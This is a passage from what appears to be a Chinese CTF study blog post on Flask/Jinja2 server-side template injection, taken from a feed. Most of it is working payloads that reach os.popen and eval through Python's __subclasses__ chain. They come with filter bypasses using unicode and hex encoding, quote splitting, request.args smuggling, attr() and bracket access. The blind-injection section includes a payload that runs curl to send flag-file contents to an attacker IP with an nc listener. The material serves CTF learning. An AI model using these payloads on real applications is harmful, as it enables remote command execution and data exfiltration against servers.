<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls /").read()'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可以看到，在payload中，只要是字符串的，即payload中引号内的，都可以用编码绕过。同理还可以进行rot13、16进制编码等。</p>
<h4 id="利用Unicode编码绕过关键字（flask适用）"><a href="#利用Unicode编码绕过关键字（flask适用）" class="headerlink" title="利用Unicode编码绕过关键字（flask适用）"></a>利用Unicode编码绕过关键字（flask适用）</h4><p>我们可以利用unicode编码的方法，绕过关键字过滤，例如：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\u0065\u0076\u0061\u006c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls /").read()'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>

<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'\u006f\u0073'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'\u006c\u0073\u0020\u002f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>等同于：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls /").read()'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>

<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="利用Hex编码绕过关键字"><a href="#利用Hex编码绕过关键字" class="headerlink" title="利用Hex编码绕过关键字"></a>利用Hex编码绕过关键字</h4><p>和上面那个一样，只不过将Unicode编码换成了Hex编码，适用于过滤了“u”的情况。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\x65\x76\x61\x6c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls /").read()'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>

<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'\x6f\x73'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'\x6c\x73\x20\x2f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>等同于：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls /").read()'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>

<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="利用引号绕过"><a href="#利用引号绕过" class="headerlink" title="利用引号绕过"></a>利用引号绕过</h4><p>我们可以利用引号来绕过对关键字的过滤。例如，过滤了flag，那么我们可以用 fl””ag 或 fl’’ag 的形式来绕过：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/fl"</span><span class="token string">"ag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>参考<a href="https://xz.aliyun.com/t/9584#toc-13">以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用</a></p>
<h2 id="flask过滤练习"><a href="#flask过滤练习" class="headerlink" title="flask过滤练习"></a>flask过滤练习</h2><h3 id="flask无过滤"><a href="#flask无过滤" class="headerlink" title="flask无过滤"></a>flask无过滤</h3><p>这个是没有任何过滤，采用的是flask框架的jinja2模板，<br>先拿它做实验<br>首先获取空字符串对象的基类<code>object</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
或者code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>获取基类<code>object</code>的所有子类<br>根据常用注入模块我们查找是否含有<code>&lt;class &#39;os._wrap_close&#39;&gt;</code><br><img src="https://img-blog.csdnimg.cn/07180aa1b9d24427a032f3c92c53d4e5.png" alt="789"><br>这个时候找到<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>对应的编号，将所有子类复制出来按行排列，由于记事本是从1行开始排列，而我们计算子类是从0开始，显示在118行，对应编号为117</p>
<blockquote>
<p>Python中索引是从0开始的<br>请注意，由于__subclasses__()方法返回的是当前运行时所有直接子类的列表，具体的子类顺序可能会随着Python版本、实现和环境的变化而有所不同。因此，这段代码的具体输出将取决于你运行的Python环境。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/9ada2137faee4a4fb673024cf7b55701.png" alt="789"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/952bf190e6cb481f816fb6cb7bc31605.png" alt="456"></p>
<p>访问该子类的 <code>__init__ </code>方法的<code>__globals__</code>属性。<br>发现有os函数<br><img src="https://img-blog.csdnimg.cn/bf73577451764a219ad24f0b3f8e9877.png" alt="123"><br>在这里可以直接使用</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>或者使用<code>__builtins__</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>





<p><img src="https://img-blog.csdnimg.cn/d09578caf19e40f08cd1f334b088e455.png" alt="789"><br>利用内建函数eval<br><code>code=&#123;&#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['eval']&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/e33fd0455ba04537806411548a066568.png" alt="1"><br><code>code=&#123;&#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/f0a6e437eb5c4283a359731cb10d73fe.png" alt="789"></p>
<h3 id="过滤双大括号"><a href="#过滤双大括号" class="headerlink" title="过滤双大括号"></a>过滤双大括号</h3><p>这里过滤了<code>&#123;&#123;&#125;&#125;</code>，你可以使用<code>&#123;%print()%&#125;</code><br><code>code=&#123;%print(8*8)%&#125;</code><br>成功回显64，后面步骤一样</p>
<p><code>code=&#123;%print(().__class__.__base__.__subclasses__()[117].__init__.__globals__.popen("ls").read())%&#125; code=&#123;%print(().__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()"))%&#125;</code></p>
<p>也可以使用 <code>&#123;% if ... %&#125;1&#123;% endif %&#125; </code>配合 <code>os.popen</code> 和 <code>curl </code>将执行结果外带（不外带的话无回显）出来</p>
<blockquote>
<p>1、服务器监听端口：</p>
<p>nc -lnvp 80<br>2、payload：<br><code>&#123;% if config.__class__.__init__.__globals__['os'].popen('curl http://8.130.xx.xx:80/`cat /f*`').read()=='p' %&#125;1&#123;% endif %&#125;</code></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/5ba05bb509a64b6981cce4dfd716247d.png" alt="789"></p>
<h3 id="flask无回显"><a href="#flask无回显" class="headerlink" title="flask无回显"></a>flask无回显</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1</span>、服务器监听端口：
nc <span class="token operator">-</span>lnvp <span class="token number">80</span>
<span class="token number">2</span>、payload：
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'curl http://8.130.xx.xx:80/`cat /f*`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'p'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token number">1</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/5ba05bb509a64b6981cce4dfd716247d.png" alt="789"></p>
<h3 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h3><p>这里只是过滤了<code>[]</code><br>如果没有任何过滤就直接到</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>但是这里需要绕过`<span class="token punctuation">[</span><span class="token punctuation">]</span>`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p><img src="https://img-blog.csdnimg.cn/c3ffdc809d0344c5884b6d507b07b0f0.png" alt="789"></p>
<h3 id="过滤了单、双引号"><a href="#过滤了单、双引号" class="headerlink" title="过滤了单、双引号"></a>过滤了单、双引号</h3><p>这里可以利用<strong>request对象绕过</strong><a href="https://3143047748.github.io/2023/11/15/SSTI%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%AD%A6%E4%B9%A0/#request%E7%BB%95%E8%BF%87%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4">详细解释</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token comment">#然后get传参a=popen&amp;b=ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/d0e661f4058c467eb2dfc0e1ff0ada18.png" alt="123"></p>
<h3 id="过滤下划线"><a href="#过滤下划线" class="headerlink" title="过滤下划线"></a>过滤下划线</h3><p>这个题目过滤了下划线，也就是说<code>__class__</code>等带下划线的都不能输入，还可以使用上面的方法<strong>request对象绕过</strong>，比如说要输入<code>&#123;&#123;''.__class__&#125;&#125;</code>那就可以这样</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token comment">#然后get传入__calss__</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/9e0bfb01bbf74dc18972cc8fcc054a63.png" alt="123"><br>以此类推：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>b<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#?a=__class__&amp;b=__base__</span>
code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>b<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>c<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#?a=__class__&amp;b=__base__&amp;c=__subclasses__</span>
code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>b<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>c<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>d<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>e<span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#?a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__init__&amp;e=__globals__</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/5ca68e768f8b4065a5aee6b36856c117.png" alt="456"></p>
<h3 id="过滤了-模板注入"><a href="#过滤了-模板注入" class="headerlink" title="过滤了.模板注入"></a>过滤了<code>.</code>模板注入</h3><h4 id="attr-函数"><a href="#attr-函数" class="headerlink" title="attr()函数"></a>attr()函数</h4><p>在<strong>flask框架</strong>的jinja2模板中如果<code>.</code>被过滤了那么可以使用原生jinja2的attr()函数。<br>比如：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token comment">#改写为</span>
code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span> <span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__class__"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token comment">#那么</span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token comment">#就可以改写为</span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__class__"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__base__"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__subclasses__"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__getitem__"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#注意这里不能直接[117]，别问为什么，我试了不行</span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__class__"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__base__"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__subclasses__"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__getitem__"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__init__"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__globals__"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"popen"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"ls /"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token comment">#按理说这样就可以了，可是我测试了发现过不去哎</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="利用中括号-绕过"><a href="#利用中括号-绕过" class="headerlink" title="利用中括号[ ]绕过"></a>利用中括号[ ]绕过</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">[</span><span class="token string">"__class__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"__base__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"__subclasses__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"__init__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"__globals__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"popen"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>`
也就是
`<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



]]></content>
      <categories>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
